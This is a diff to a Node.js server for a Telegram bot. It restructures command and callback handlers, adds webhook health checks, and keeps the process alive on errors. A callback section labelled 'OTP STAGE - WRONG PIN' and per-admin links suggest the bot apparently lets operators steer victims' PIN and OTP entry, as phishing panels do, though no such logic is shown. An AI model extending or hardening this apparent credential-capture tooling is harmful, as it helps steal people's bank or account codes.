@@ -32,8 +32,20 @@ app.use(express.static(__dirname));
 // ==========================================
 // ✅ SETUP BOT HANDLERS IMMEDIATELY!
 // ==========================================
-setupBotHandlers();
-console.log('✅ Bot handlers configured!');
+console.log('⏳ Setting up bot handlers...');
+
+// Error handlers
+bot.on('error', (error) => {
+    console.error('❌ Bot error:', error?.message);
+});
+
+bot.on('polling_error', (error) => {
+    console.error('❌ Polling error:', error?.message);
+});
+
+// We'll setup command handlers now, but callback handlers after webhook is set
+setupCommandHandlers();
+console.log('✅ Command handlers configured!');
 
 // ✅ SETUP WEBHOOK ENDPOINT (after middleware, before async init)
 const webhookPath = `/telegram-webhook`;
@@ -79,6 +91,9 @@ db.connectDatabase()
         await bot.setWebHook(fullWebhookUrl);
         console.log(`🤖 Webhook set to: ${fullWebhookUrl}`);
         
+        // ✅ NOW setup callback handlers (after webhook is ready)
+        setupCallbackHandlers();
+        
         // Test bot API connectivity
         try {
             const botInfo = await bot.getMe();
@@ -89,8 +104,18 @@ db.connectDatabase()
         
         // Keep-alive mechanism to prevent premature exit
         setInterval(() => {
-            // This keeps the event loop active
+            console.log(`💓 Keep-alive: Server running, ${adminChatIds.size} admins connected`);
         }, 60000); // Every 60 seconds
+        
+        // Periodic webhook health check
+        setInterval(async () => {
+            try {
+                const info = await bot.getWebHookInfo();
+                console.log(`🔍 Webhook status: ${info.url ? 'SET' : 'NOT SET'} | Pending: ${info.pending_update_count || 0}`);
+            } catch (error) {
+                console.error('⚠️ Webhook check error:', error.message);
+            }
+        }, 300000); // Every 5 minutes
         
         console.log('✅ System fully initialized and running!');
     })
@@ -126,16 +151,7 @@ async function loadAdminChatIds() {
 // ✅ BOT HANDLERS
 // ==========================================
 
-function setupBotHandlers() {
-    // Error handler for bot
-    bot.on('error', (error) => {
-        console.error('❌ Bot error:', error);
-    });
-    
-    bot.on('polling_error', (error) => {
-        console.error('❌ Polling error:', error);
-    });
-    
+function setupCommandHandlers() {
     // Start command
     bot.onText(/\/start/, async (msg) => {
         const chatId = msg.chat.id;
@@ -454,12 +470,18 @@ ${process.env.APP_URL || WEBHOOK_URL}?admin=${newAdminId}
         }
     });
 
+    console.log('✅ Command handlers setup complete!');
+}
+
+// Setup callback handlers separately
+function setupCallbackHandlers() {
     // Callback queries
     bot.on('callback_query', async (callbackQuery) => {
+        console.log(`📞 Callback query received at ${new Date().toISOString()}`);
         await handleCallback(callbackQuery);
     });
-
-    console.log('✅ Bot handlers configured!');
+    
+    console.log('✅ Callback handlers setup complete!');
 }
 
 // Helper to get adminId from chatId
@@ -494,22 +516,25 @@ async function sendToAdmin(adminId, message, options = {}) {
 // ==========================================
 
 async function handleCallback(callbackQuery) {
-    const chatId = callbackQuery.message.chat.id;
-    const messageId = callbackQuery.message.message_id;
-    const data = callbackQuery.data;
-    const adminId = getAdminIdByChatId(chatId);
-    
-    console.log(`\n🔘 Callback received: ${data}`);
-    console.log(`   From admin: ${adminId}`);
-    console.log(`   Chat ID: ${chatId}`);
-    
-    if (!adminId) {
-        await bot.answerCallbackQuery(callbackQuery.id, {
-            text: '❌ Not authorized!',
-            show_alert: true
-        });
-        return;
-    }
+    try {
+        const chatId = callbackQuery.message.chat.id;
+        const messageId = callbackQuery.message.message_id;
+        const data = callbackQuery.data;
+        const adminId = getAdminIdByChatId(chatId);
+        
+        console.log(`\n🔘 Callback received: ${data}`);
+        console.log(`   From admin: ${adminId}`);
+        console.log(`   Chat ID: ${chatId}`);
+        console.log(`   Message ID: ${messageId}`);
+        
+        if (!adminId) {
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ Not authorized!',
+                show_alert: true
+            });
+            console.log(`❌ Unauthorized callback attempt from chat ${chatId}`);
+            return;
+        }
     
     // ==========================================
     // OTP STAGE - WRONG PIN
@@ -713,6 +738,27 @@ async function handleCallback(callbackQuery) {
     }
     
     console.log(`⚠️ Unknown callback data: ${data}`);
+    await bot.answerCallbackQuery(callbackQuery.id, {
+        text: '⚠️ Unknown action',
+        show_alert: false
+    });
+    } catch (error) {
+        console.error('\n❌❌❌ ERROR IN CALLBACK HANDLER ❌❌❌');
+        console.error('Error:', error?.message);
+        console.error('Stack:', error?.stack);
+        console.error('Callback data:', callbackQuery?.data);
+        console.error('❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n');
+        
+        // Try to answer the callback even on error
+        try {
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ Error processing request',
+                show_alert: true
+            });
+        } catch (answerError) {
+            console.error('Failed to answer callback:', answerError?.message);
+        }
+    }
 }
 
 // ==========================================
@@ -1063,23 +1109,33 @@ app.listen(PORT, () => {
     console.log(`\n✅ Ready!\n`);
 });
 
-async function shutdownGracefully() {
-    console.log('🛑 Shutting down...');
-    await bot.deleteWebHook();
-    await db.closeDatabase();
-    console.log('✅ Done');
-    process.exit(0);
+// Graceful shutdown only on actual termination signals
+async function shutdownGracefully(signal) {
+    console.log(`\n🛑 Received ${signal}, shutting down gracefully...`);
+    try {
+        await bot.deleteWebHook();
+        await db.closeDatabase();
+        console.log('✅ Cleanup completed');
+        process.exit(0);
+    } catch (error) {
+        console.error('❌ Error during shutdown:', error);
+        process.exit(1);
+    }
 }
 
-process.on('SIGTERM', shutdownGracefully);
-process.on('SIGINT', shutdownGracefully);
+// Only shutdown on these signals
+process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
+process.on('SIGINT', () => shutdownGracefully('SIGINT'));
 
+// Log errors but DO NOT exit - stay alive!
 process.on('unhandledRejection', (error) => {
-    console.error('❌ Unhandled rejection:', error);
+    console.error('❌ Unhandled rejection (non-fatal):', error?.message);
     console.error('Stack:', error?.stack);
+    // DO NOT EXIT - just log it
 });
 
 process.on('uncaughtException', (error) => {
-    console.error('❌ Uncaught exception:', error);
+    console.error('❌ Uncaught exception (non-fatal):', error?.message);
     console.error('Stack:', error?.stack);
+    // DO NOT EXIT - just log it
 });
